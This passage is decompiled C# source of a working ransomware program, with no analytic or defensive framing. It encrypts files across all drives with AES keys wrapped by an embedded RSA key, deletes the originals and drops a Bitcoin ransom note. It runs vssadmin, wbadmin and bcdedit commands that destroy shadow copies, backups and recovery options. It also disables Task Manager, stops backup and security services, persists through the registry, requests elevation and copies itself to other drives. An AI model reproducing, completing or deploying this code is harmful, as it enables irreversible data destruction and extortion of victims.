823wUfqasdmbJvMzMxJVTl8mbQEdI/tQO7BNzR308TZfp4hx/fM2l3tWuIJVLTrEgywKgxuCBL6yBt115WMNcSyqsZzvrIjMqdVnST18z0oJw62qJlX3dzyLc6IYlmBE+1C7+6ABAjrAB8p67cbO255100+1Al99/31LGLxzkQPAh1CzqQebHcz1O9WOzFxRdOe4ltcuzsq5zOmWd41mKDXywDEatr569fOpDi8U1tU78qdIVEQADoIWfjNGhFgsZefEwxlEA5mr4n2nwmHGa7eUjl3YL5jzVck6jSdgJGtZPiX7Q3uXLSWU7m09y2jXGKtdyuYkDVE1I+tvyqlx/gr3Qyqc7WlRGZ3Egt43YljMCFXTmT1qLsf2Ju4xTnJTDjMBc2NyPZNoHcTBzHTpJ26WnKMLnn9QjJ0Zt+zmDtriUcL4yHzXGJa4wj3rjSzCY0JgRRPic2rpxCglGAS8g1JQHw3FHNrckwNSpbchRQzslnN4C4IuLbuhx0uKVVo8iZIPMEHnRvimOtWsve3Et5jC53Vcx6LmOp9Ka5oxSAEzttlYAgggiQQZBB2IPMGsv2r4LF+xirULd7xLdyNrtpvbDeaqpYH7I6CLOYpevZCVEpAUwslQzNl9mWLSTGtMuX2LeJixOoJPTfQaA68gJnyoUUg2IbsKox00Dx3Z649xnt32tqxnKJ0J9o7c2k/GjDNrFNz04CKuUA8mF0jQkcvIcifyp7ITltWjD3Wyqd8syXuHrlUM2u5AHOlSrQ/Uzp3NO9tUVbSDKiKFUDkFEAfACo6VKsc6g6irE9tuxK2F/erCZUb+Kij+GSdGA5K2kjkfI6KlTMX4pn1X4Zn+ynHruHvlbMzdRrUcg7CUuRzyHxfdz9a3WHUKqqogKAAOgAgD5UqVPbuY06le+03EHIB2+IyqPwdvlU2B1toRrKqZ6yBSpUJ6hL3Mx+0vhOeyt9R4rRhv8A9bHf4NB9GavOqVKrHUF+5JhcQ1tsynX8COh8q1HDsal5dNDzXmPTqPOlSpTzXo2O7b4kOIw72zmt6g+0nI+a/VNR4r6VA9snOhkcmBG4PQ8//NKlWrCxK8zHrcao/wAZetlcVaB9i4mkjdG/PKY2/UUFxeMxNpijnmIOUEHpBAEg/wB/OlSphmZSZZtdq7oHiRG9Myz+dWE7TzqbbgjfIQwHzilSoTCDGWMLxtbhhQxnQjLrrymYnymjXG+yb2sPcxNwLZVEzZSfGWOipkWQCWIG+k0qVZsrEMKm7GoKczB3MWx5x6f3qE9aVKr77gjjqIUc7M23L+CZg840jn8YpUqRqP8AGZu0H+ZZu+z2EHeW0IkDU/AE6+UxRrinCE8d0liQGYgncjUDy2j0pUq8tlyN9QTrarIyZht9D94ARCRp1AHmx2H4GruGMkW7Sz1bm0efurPLnSpVqXkiasxsE+oU4HwBMtwXfpAzknNs+U+8s6jNOhkHKDT+0nb3DYOUDC7e2FtDop5d4w0QDpv5c6VKupplE89qWJJuZbsR2mc8QzXiCcS5BaIAY2yqqPI93aUfc5k1B+13GO2NtWk/07IcerM5c/021+RrtKtzqNw/SYUPH+5J2CxwbD5GclwzEBpnIAoGUn2gNtNtJjSj2ITMNNxqPX+x1B8iaVKqjO+4WxOE760l5B4yoLDmxjxfzAyPhFBZpUqLF5gGf//Z";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "readme.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"Don't worry, you can return all your files!", "", "All your files like documents, photos, databases and other important are encrypted", "", "What guarantees do we give to you?", "", "You can send 3 of your encrypted files and we decrypt it for free.", "", "You must follow these steps To decrypt your files :   ", "1) Write on our e-mail :test@test.com ( In case of no answer in 24 hours check your spam folder",
		"or write us to this e-mail: test2@test.com)", "", "2) Obtain Bitcoin (You have to pay for decryption in Bitcoins. ", "After payment we will send you the tool that will decrypt all your files.)"
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>oNviQ/kouK/no32BF5Hejx+pNZuZIcbyKSIjgwTE3zT6ai36uNfUwC2cQqPyrvAh/I5/D6Scp+Rwb0guY8ygGp611TrQG8UnFgPsp618OEIHoBk32tZnW5qsol4LRR1TYK3iFVJvGudVYUgVzcDIWJHpQUErW9t3JQblYtJIg4M4z95z62n8YhLE1DEQmYC2QBG1lQQenfWDtNGE5uJrIMFqmaZaZBL2tEse84E46aKufWQOynT/ECZbqxYC+SlQeXp1SOkohPHTwiB3ZtYwpMMfVrQtwj0lINVh/Hr1HWhLDo1mIsdn9hxpNesZu4AhV0jiIKDMpFtDsAelKchZ6Q==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
